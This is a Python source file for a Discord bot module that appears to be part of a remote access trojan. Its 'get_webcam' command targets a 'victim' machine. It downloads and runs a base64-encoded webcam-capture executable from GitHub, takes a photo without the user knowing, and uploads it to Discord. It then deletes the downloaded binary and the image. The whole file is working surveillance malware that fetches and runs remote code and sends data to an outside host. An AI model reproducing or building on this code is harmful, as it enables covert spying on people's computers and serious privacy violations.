import disnake as discord
from disnake.ext import commands
from datetime import datetime
from base64 import decodebytes

import os
import requests
import subprocess
import time


class GetWebcam(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.slash_command()
    async def get_webcam(self, ctx, victim):
        """Capture image from webcam

        Parameters
        ----------
        victim: Identifier of the affected computer (found via /listvictims).
        """
        if self.bot.valid(victim):
            await ctx.response.defer()

            webcam = bytes(
                requests.get(
                    "https://raw.githubusercontent.com/NullCode13-Misc/CommandCam/master/CommandCam_binary_base64"
                ).text,
                "utf-8",
            )

            os.chdir(self.bot.nr_working)
            with open("cc.exe", "wb") as fh:
                fh.write(decodebytes(webcam))

            subprocess.run(
                "cc.exe & ren image.bmp image.png",
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
            )

            try:
                await ctx.followup.send(
                    embed=self.bot.genEmbed("Image taken from webcam:", datetime.now()),
                    file=discord.File(self.bot.nr_working + "\\image.png"),
                )
            except FileNotFoundError:
                os.remove(self.bot.nr_working + "\\cc.exe")
                return await ctx.followup.send("No webcam!")

            time.sleep(2)
            os.remove(self.bot.nr_working + "\\image.png")
            os.remove(self.bot.nr_working + "\\cc.exe")
            os.chdir(self.bot.original_dir)


def setup(bot: commands.Bot):
    bot.add_cog(GetWebcam(bot))
